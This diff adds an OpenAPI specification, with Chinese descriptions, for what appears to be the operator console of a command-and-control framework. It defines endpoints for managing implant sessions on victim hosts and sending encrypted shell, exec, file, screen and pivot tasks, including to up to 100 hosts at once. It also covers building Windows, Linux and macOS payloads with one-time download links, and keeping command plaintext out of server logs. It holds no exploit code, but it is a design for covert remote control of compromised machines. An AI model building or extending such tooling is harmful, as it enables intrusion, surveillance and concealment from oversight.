@@ -1,0 +1,593 @@
+openapi: 3.1.0
+info:
+  title: Stratus Console API
+  version: 0.1.0
+  description: |
+    管理端 REST API（console worker）。
+
+    **服务端只处理密文**：`POST /sessions/{id}/tasks` 里的 `ct` / `n` 是浏览器用操作员私钥派生的密钥加密的，
+    服务端不解密、不校验内容；`GET /results/{taskId}` 返回的也是密文 + 解密所需的 `nonce` / `rid`。
+
+    认证：`AUTH_MODE=token` 时用 `Authorization: Bearer <ADMIN_TOKEN>`；
+    `AUTH_MODE=access` 时由 Cloudflare Access 前置注入 header，浏览器无需带 token。
+servers:
+  - url: /api/v1
+security:
+  - bearerAuth: []
+tags:
+  - name: auth
+  - name: sessions
+  - name: tasks
+  - name: payloads
+  - name: keys
+  - name: ops
+
+paths:
+  /health:
+    get:
+      tags: [ops]
+      summary: 健康检查（公开）
+      security: []
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  ok: { type: boolean }
+                  version: { type: string }
+                  env: { type: string }
+
+  /me:
+    get:
+      tags: [auth]
+      summary: 当前操作员身份
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/Me' }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+
+  /sessions:
+    get:
+      tags: [sessions]
+      summary: 会话列表
+      parameters:
+        - { name: status, in: query, schema: { type: string, enum: [online, offline, dead, quarantined] } }
+        - { name: os, in: query, schema: { type: string } }
+        - { name: tag, in: query, schema: { type: string } }
+        - { name: q, in: query, schema: { type: string }, description: 匹配 host/user/内网IP/出口IP/sid }
+        - { name: sort, in: query, schema: { type: string, enum: [last_seen, first_seen, host, status] } }
+        - { name: page, in: query, schema: { type: integer, minimum: 1, default: 1 } }
+        - { name: page_size, in: query, schema: { type: integer, minimum: 1, maximum: 200, default: 50 } }
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  items:
+                    type: array
+                    items: { $ref: '#/components/schemas/Session' }
+                  total: { type: integer }
+                  page: { type: integer }
+                  page_size: { type: integer }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+
+  /sessions/{id}:
+    parameters:
+      - { name: id, in: path, required: true, schema: { type: string } }
+    get:
+      tags: [sessions]
+      summary: 会话详情（含 implantPub 与最近任务）
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/SessionDetail' }
+        '404': { $ref: '#/components/responses/NotFound' }
+    delete:
+      tags: [sessions]
+      summary: 标记会话 dead 并尽力下发 kill
+      parameters:
+        - { name: confirm, in: query, required: true, schema: { type: string, enum: ['1'] } }
+      responses:
+        '200': { description: 已标记 }
+        '409': { $ref: '#/components/responses/Conflict' }
+
+  /sessions/{id}/tags:
+    post:
+      tags: [sessions]
+      summary: 增删标签
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                add: { type: array, items: { type: string } }
+                remove: { type: array, items: { type: string } }
+      responses:
+        '200':
+          description: 新标签集合
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  tags: { type: array, items: { type: string } }
+
+  /sessions/{id}/tasks:
+    post:
+      tags: [tasks]
+      summary: 下发任务（密文）
+      description: |
+        `ct` 是 L2 密文（AES-256-GCM，密钥由 ECDH 派生）；`n` 是 12 字节 nonce（base64url）。
+        `rid` 必须与密文里的一致（它参与 AAD）。
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/TaskCreate' }
+      responses:
+        '202':
+          description: 已入队
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  task_id: { type: string }
+                  queued: { type: boolean }
+                  online: { type: boolean }
+                  request_id: { type: string }
+        '400': { $ref: '#/components/responses/BadRequest' }
+        '404': { $ref: '#/components/responses/NotFound' }
+
+  /tasks/bulk:
+    post:
+      tags: [tasks]
+      summary: 批量下发（≤100 台）
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              allOf:
+                - $ref: '#/components/schemas/TaskCreate'
+                - type: object
+                  properties:
+                    targets: { type: array, items: { type: string }, maxItems: 100 }
+      responses:
+        '202':
+          description: 逐项结果
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  ok: { type: array, items: { type: string } }
+                  failed:
+                    type: array
+                    items:
+                      type: object
+                      properties:
+                        sid: { type: string }
+                        code: { type: string }
+
+  /tasks:
+    get:
+      tags: [tasks]
+      summary: 任务流水
+      parameters:
+        - { name: session_id, in: query, schema: { type: string } }
+        - { name: status, in: query, schema: { type: string } }
+        - { name: cat, in: query, schema: { type: string } }
+        - { name: page, in: query, schema: { type: integer, default: 1 } }
+        - { name: page_size, in: query, schema: { type: integer, default: 50 } }
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  items: { type: array, items: { $ref: '#/components/schemas/Task' } }
+                  total: { type: integer }
+
+  /tasks/{id}:
+    delete:
+      tags: [tasks]
+      summary: 取消（仅 queued 可取消）
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      responses:
+        '200': { description: OK }
+
+  /results/{taskId}:
+    get:
+      tags: [tasks]
+      summary: 取结果密文（含 nonce 与 rid）
+      parameters:
+        - { name: taskId, in: path, required: true, schema: { type: string } }
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/TaskResult' }
+        '404': { $ref: '#/components/responses/NotFound' }
+
+  /payloads:
+    get:
+      tags: [payloads]
+      summary: 载荷列表
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  items: { type: array, items: { $ref: '#/components/schemas/Payload' } }
+    post:
+      tags: [payloads]
+      summary: 创建载荷（psk 只返回一次）
+      requestBody:
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                name: { type: string }
+                os: { type: string, enum: [windows, linux, darwin] }
+                arch: { type: string, enum: [amd64, arm64, 386] }
+                note: { type: string }
+      responses:
+        '201':
+          description: 已创建
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  id: { type: string }
+                  psk_id: { type: string }
+                  psk: { type: string, description: 仅此一次返回 }
+                  config: { type: object, additionalProperties: true }
+        '409':
+          description: 还没登记操作员公钥
+          content:
+            application/json:
+              schema: { $ref: '#/components/schemas/Error' }
+
+  /payloads/{id}/binary:
+    post:
+      tags: [payloads]
+      summary: 上传已编译的二进制到 R2
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+        - { name: name, in: query, schema: { type: string } }
+      requestBody:
+        content:
+          application/octet-stream:
+            schema: { type: string, format: binary }
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  ok: { type: boolean }
+                  size: { type: integer }
+
+  /payloads/{id}/link:
+    post:
+      tags: [payloads]
+      summary: 生成一次性下载链接（10 分钟）
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  url: { type: string }
+                  expires_in: { type: integer }
+
+  /payloads/{id}:
+    delete:
+      tags: [payloads]
+      summary: 吊销载荷（已在线会话不受影响）
+      parameters:
+        - { name: id, in: path, required: true, schema: { type: string } }
+      responses:
+        '200': { description: OK }
+
+  /keys:
+    get:
+      tags: [keys]
+      summary: 已登记的操作员公钥
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  items:
+                    type: array
+                    items: { $ref: '#/components/schemas/OperatorKey' }
+    post:
+      tags: [keys]
+      summary: 登记公钥（P-256 未压缩点）
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [keyId, pub, fp]
+              properties:
+                keyId: { type: string }
+                pub: { type: string, description: base64url(65B) }
+                fp: { type: string, description: SHA256(pub)[:8] 的 hex }
+      responses:
+        '201': { description: 已登记 }
+        '400': { $ref: '#/components/responses/BadRequest' }
+
+  /keys/{keyId}:
+    delete:
+      tags: [keys]
+      summary: 吊销公钥（历史密文仍可解）
+      parameters:
+        - { name: keyId, in: path, required: true, schema: { type: string } }
+      responses:
+        '200': { description: OK }
+
+  /audit:
+    get:
+      tags: [ops]
+      summary: 审计日志（不含命令明文）
+      parameters:
+        - { name: action, in: query, schema: { type: string } }
+        - { name: actor, in: query, schema: { type: string } }
+        - { name: target, in: query, schema: { type: string } }
+        - { name: page, in: query, schema: { type: integer, default: 1 } }
+        - { name: page_size, in: query, schema: { type: integer, default: 100, maximum: 500 } }
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  items: { type: array, items: { $ref: '#/components/schemas/AuditRow' } }
+                  total: { type: integer }
+
+  /stats:
+    get:
+      tags: [ops]
+      summary: 仪表盘统计
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  sessions:
+                    type: object
+                    properties:
+                      total: { type: integer }
+                      online: { type: integer }
+                  tasks:
+                    type: object
+                    properties:
+                      total: { type: integer }
+                      done: { type: integer }
+                      success_rate: { type: number }
+                  by_cat:
+                    type: array
+                    items:
+                      type: object
+                      properties:
+                        cat: { type: string }
+                        n: { type: integer }
+
+  /quota:
+    get:
+      tags: [ops]
+      summary: 免费额度水位
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  daily: { type: array, items: { type: object, additionalProperties: true } }
+                  free_tier: { type: object, additionalProperties: true }
+                  reference_budget: { type: object, additionalProperties: true }
+                  verdicts:
+                    type: array
+                    items:
+                      type: object
+                      properties:
+                        key: { type: string }
+                        used: { type: number }
+                        limit: { type: number }
+                        ratio: { type: number }
+                        level: { type: string, enum: [ok, warn, crit] }
+
+components:
+  securitySchemes:
+    bearerAuth:
+      type: http
+      scheme: bearer
+  responses:
+    Unauthorized:
+      description: 未认证 / 令牌无效
+      content:
+        application/json:
+          schema: { $ref: '#/components/schemas/Error' }
+    Forbidden:
+      description: 角色不足
+      content:
+        application/json:
+          schema: { $ref: '#/components/schemas/Error' }
+    NotFound:
+      description: 资源不存在
+      content:
+        application/json:
+          schema: { $ref: '#/components/schemas/Error' }
+    BadRequest:
+      description: 参数不合法
+      content:
+        application/json:
+          schema: { $ref: '#/components/schemas/Error' }
+    Conflict:
+      description: 状态不允许 / 缺确认
+      content:
+        application/json:
+          schema: { $ref: '#/components/schemas/Error' }
+  schemas:
+    Error:
+      type: object
+      properties:
+        error:
+          type: object
+          properties:
+            code: { type: string }
+            message: { type: string }
+            details: { type: object, additionalProperties: true }
+            request_id: { type: string }
+    Me:
+      type: object
+      properties:
+        id: { type: string }
+        email: { type: string }
+        role: { type: string, enum: [viewer, operator, admin] }
+        request_id: { type: string }
+    Session:
+      type: object
+      properties:
+        id: { type: string }
+        host: { type: string, nullable: true }
+        username: { type: string, nullable: true }
+        os: { type: string, nullable: true }
+        arch: { type: string, nullable: true }
+        internalIp: { type: string, nullable: true }
+        externalIp: { type: string, nullable: true }
+        country: { type: string, nullable: true }
+        status: { type: string, enum: [online, offline, dead, quarantined] }
+        caps: { type: array, items: { type: string } }
+        tags: { type: array, items: { type: string } }
+        firstSeen: { type: integer }
+        lastSeen: { type: integer }
+        task_stats: { type: object, additionalProperties: { type: integer } }
+    SessionDetail:
+      allOf:
+        - $ref: '#/components/schemas/Session'
+        - type: object
+          properties:
+            implantPub: { type: string, nullable: true, description: base64url(65B)，浏览器用它算 ECDH }
+            recent_tasks:
+              type: array
+              items: { $ref: '#/components/schemas/Task' }
+    TaskCreate:
+      type: object
+      required: [cat, rid, n, ct]
+      properties:
+        cat:
+          type: string
+          enum: [shell, exec, file, proc, screen, net, pivot, sys, module, e2e]
+        ttl: { type: integer, minimum: 10, maximum: 3600, default: 60 }
+        rid: { type: string, description: base64url(8B)，参与 AAD }
+        n: { type: string, description: base64url(12B) nonce }
+        ct: { type: string, description: base64url(L2 密文) }
+        confirm: { type: boolean, description: 破坏性分类必须为 true }
+        targets: { type: array, items: { type: string } }
+    Task:
+      type: object
+      properties:
+        id: { type: string }
+        sessionId: { type: string }
+        cat: { type: string }
+        status:
+          type: string
+          enum: [queued, dispatched, running, done, failed, expired, canceled]
+        size: { type: integer, nullable: true }
+        rid: { type: string, nullable: true }
+        createdAt: { type: integer }
+        dispatchedAt: { type: integer, nullable: true }
+        completedAt: { type: integer, nullable: true }
+        expiresAt: { type: integer, nullable: true }
+        err: { type: string, nullable: true }
+    TaskResult:
+      type: object
+      properties:
+        taskId: { type: string }
+        inlineCt: { type: string, nullable: true }
+        r2Key: { type: string, nullable: true }
+        nonce: { type: string, nullable: true }
+        rid: { type: string, nullable: true }
+        size: { type: integer }
+        truncated: { type: integer }
+        createdAt: { type: integer }
+    Payload:
+      type: object
+      properties:
+        id: { type: string }
+        name: { type: string }
+        pskId: { type: string }
+        os: { type: string, nullable: true }
+        arch: { type: string, nullable: true }
+        size: { type: integer, nullable: true }
+        sha256: { type: string, nullable: true }
+        createdAt: { type: integer }
+        revokedAt: { type: integer, nullable: true }
+    OperatorKey:
+      type: object
+      properties:
+        keyId: { type: string }
+        operatorId: { type: string }
+        pubRaw: { type: string }
+        fp: { type: string }
+        createdAt: { type: integer }
+        revokedAt: { type: integer, nullable: true }
+    AuditRow:
+      type: object
+      properties:
+        id: { type: string }
+        ts: { type: integer }
+        actorType: { type: string, enum: [operator, implant, system] }
+        actorId: { type: string, nullable: true }
+        action: { type: string }
+        target: { type: string, nullable: true }
+        requestId: { type: string, nullable: true }
+        ip: { type: string, nullable: true }
+        meta: { type: string, nullable: true }
